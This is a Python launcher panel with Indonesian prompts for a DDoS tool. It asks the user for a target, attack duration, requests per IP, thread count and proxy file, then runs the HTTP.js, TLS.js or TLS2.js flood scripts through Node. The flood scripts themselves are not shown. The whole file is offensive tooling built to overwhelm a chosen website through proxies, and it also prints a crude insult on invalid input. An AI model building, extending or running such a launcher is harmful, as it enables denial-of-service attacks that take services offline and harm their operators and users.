# yang di kembangkan oleh Focket <3
import subprocess
import os
from os import name, system

if name == 'nt':
    system("title F0CK3T - HTTP BROWSER")
    system("mode 101, 30")

# untuk melakukan run script nodejs
def run_script(script_name, args):
    command = ['node', script_name] + args
    subprocess.run(command)

# daptar menu extrax froxy
def count_proxy(proxy_file):
    with open(proxy_file, 'r') as file:
        proxies = file.readlines()
    # daptar menu proxyfile
    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
    return len(proxies)

# tampilan menu untuk script
def show_menu():
    os.system("cls" if os.name == "nt" else "clear")
    print()
    print("")
    print("   ▒███████▒ ▄▄▄       ██▓")
    print("   ▒ ▒ ▒ ▄▀░▒████▄    ▓██▒")
    print("   ░ ▒ ▄▀▒░ ▒██  ▀█▄  ▒██▒")
    print("     ▄▀▒   ░░██▄▄▄▄██ ░██░")
    print("   ▒███████▒ ▓█   ▓██▒░██░")
    print("   ░▒▒ ▓░▒░▒ ▒▒   ▓▒█░░▓  ")
    print("   ░░▒ ▒ ░ ▒  ▒   ▒▒ ░ ▒ ░")
    print("   ░ ░ ░ ░ ░  ░   ▒    ▒ ░")
    print("    ░ ░          ░  ░ ░  ")
    print("   ░")
    print()
    print("───────────•~❉᯽❉~•───────────")
    print("              METHOD")
    print("  〈1〉 HTTP")
    print("  〈2〉 TLS")
    print("  〈3〉 TLS2")
    print("  〈0〉 EXIT")
    print("───────────•~❉᯽❉~•───────────")

# tampilan menu untuk attack
def handle_menu_selection(selection):
    if selection == '1':
        print("\n==============HTTP==============")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        input("   tekan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daftar proxy: {proxy_count}")
        run_script('HTTP.js', [target, time, requests,thread, proxy_file,])

    elif selection == '2':
        print("\n================= TLS ================")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("=============== Hold ==============")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  tekan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('TLS.js', [target, time, requests, thread, proxy_file,])

    elif selection == '3':
        print("\n================= TLS2 =================")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= skibidi =================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  tekan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('TLS2.js', [target, time, requests, thread, proxy_file])

    else:
        print("  Lựa chọn không hợp lệ.")

# Focket panel
def start_panel():
    while True:
        show_menu()
        selection = input(" PILIH〈0-3〉: ")
        
        if selection == '0':
            break
        
        if selection not in ['1','2','3']:
            print("SALAH KONTOL")
            continue
        
        handle_menu_selection(selection)

# Focket panel
start_panel()

# https://github.com/llolyppop
